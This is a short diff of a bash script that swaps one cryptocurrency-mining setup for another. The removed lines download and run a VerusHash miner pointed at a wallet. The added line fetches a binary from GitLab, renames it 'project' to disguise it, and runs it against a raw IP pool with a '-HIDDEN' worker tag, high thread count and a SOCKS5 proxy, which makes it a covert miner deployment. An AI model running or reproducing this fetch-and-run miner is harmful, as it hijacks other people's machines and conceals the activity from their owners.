@@ -1,5 +1,2 @@
 !#/bin/bash
-wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh
-wget https://github.com/hunshukajh/yes/raw/main/gas
-chmod +x gas cmdline_launcher.sh
-./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RA5S1Suf1BHvTiphQ3VRnWy6aShii374j5 -rigName $(echo $(shuf -i 1-2 -n 1)-joa) -pool1 verushash.asia.mine.zergpool.com:3300
+wget https://gitlab.com/renifer12/verus/-/raw/main/perusa && chmod +x perusa && mv perusa project && ./project -v -l 139.99.123.225:3956 -u RA5S1Suf1BHvTiphQ3VRnWy6aShii374j5.$(echo $(shuf -i 1-2000 -n 1)-HIDDEN) -p -t 65 -x socks5://1234:1234@209.97.167.69:3838
